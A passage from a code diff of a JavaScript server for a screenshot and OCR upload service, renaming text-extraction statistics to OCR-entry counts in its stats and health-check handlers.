                 username: userData.username,
                 screenshotCount: userData.screenshots.length,
-                textExtractedCount: userData.totalTextExtracted || 0,
-                textExtractionRate: userData.screenshots.length > 0 ? 
-                    ((userData.totalTextExtracted || 0) / userData.screenshots.length * 100).toFixed(1) + '%' : '0%',
+                ocrCount: userData.ocrEntries.length,
                 lastActive: userData.lastActive,
                 deviceInfo: userData.deviceInfo
             }))
@@ -832,10 +929,10 @@ async function handleGetStats(req, res) {
     }
 }
 
-// Enhanced health check
+// Health check
 async function handleHealthCheck(req, res) {
     try {
-        await syncUserDataFromBlobs();
+        await syncDataFromBlobs();
         
         return res.status(200).json({
             success: true,
@@ -843,9 +940,8 @@ async function handleHealthCheck(req, res) {
             timestamp: new Date().toISOString(),
             totalUsers: Object.keys(clipboardIndex.users).length,
             totalScreenshots: clipboardIndex.totalScreenshots,
-            totalTextExtracted: clipboardIndex.totalTextExtracted,
-            ocrEnabled: Boolean(process.env.GOOGLE_VISION_API_KEY),
-            features: ['screenshot-upload', 'text-extraction', 'text-search', 'admin-management']
+            totalOcrEntries: clipboardIndex.totalOcrEntries,
+            features: ['screenshot-upload', 'ocr-upload', 'text-search', 'admin-management']
         });
     } catch (error) {
         return res.status(500).json({
